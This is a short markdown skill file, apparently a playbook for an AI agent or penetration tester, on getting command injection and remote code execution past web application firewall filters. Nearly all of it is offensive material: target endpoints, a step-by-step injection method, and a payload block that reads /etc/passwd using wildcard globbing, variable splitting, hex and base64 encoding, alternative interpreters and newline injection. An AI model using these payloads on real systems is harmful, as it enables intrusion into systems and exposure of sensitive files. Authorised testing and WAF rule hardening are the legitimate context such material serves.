---
name: waf-evasion-rce
description: Skill for bypassing WAF command injection and RCE filters using encoding, wildcards, alternative shells, and request smuggling. Built from the Awesome-WAF knowledge base.
sources: github
report_count: 20
---

# WAF Evasion - RCE / Command Injection

## Crown Jewel Targets

- File upload functionality (filename injection)
- Ping/traceroute diagnostic tools
- Log/backup download endpoints
- Email-sending functionality
- Image processing endpoints

## Attack Surface Signals

- WAF blocks `cat /etc/passwd` but allows wildcard forms
- WAF blocks semicolons but allows newlines or pipe operators
- WAF blocks `/bin/sh` but allows alternative shells

## Step-by-Step Methodology

1. Test basic command injection: `; id`
2. Test pipe operators: `| id`, `|| id`
3. Test newline injection: `%0Aid`
4. Test wildcard obfuscation: `/???/??t /???/??ss??`
5. Test hex encoding: `printf '\x63\x61\x74' | sh`
6. Test base64: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`
7. Test environment variables: `$u/bin$u/cat$u`
8. Test uninitialized variables: `$u/bin$u/cat$u /etc$u/passwd$u`

## Payload & Detection Patterns

```bash
# Wildcard obfuscation
/???/??t /???/??ss??

# Wildcard + environment variables
$u/bin$u/cat$u /$u/etc$u/passwd$u

# Hex encoding
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh

# Base64 encoding
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh

# Alternative shells
perl -e 'system("cat /etc/passwd")'
python3 -c 'import os; os.system("cat /etc/passwd")'

# No operator needed (newline)
%0Acat%20/etc/passwd%0A
```

## Common Root Causes

- WAF rule sets focus on common patterns (`cat`, `sh`, `/bin/bash`)
- WAFs don't normalize shell-expandable patterns (wildcards, variables)
- WAFs may not inspect all parameter sources or content types
- Encoding/decoding differences between WAF and shell

## Bypass Techniques

- Wildcard globbing: `???` matches any 3 characters
- Environment variable splitting: `$u/bin$u/cat$u`
- Hex/octal/base64 encoding of commands
- Alternative interpreters: perl, python, ruby, node
- No-newline command chaining with `%0A`
- Tab/newline as whitespace alternatives

## Gate 0 Validation

- [ ] Have I confirmed command execution?
- [ ] Have I tried wildcard obfuscation?
- [ ] Have I tried alternative interpreters?
- [ ] Have I documented the exact bypass technique?
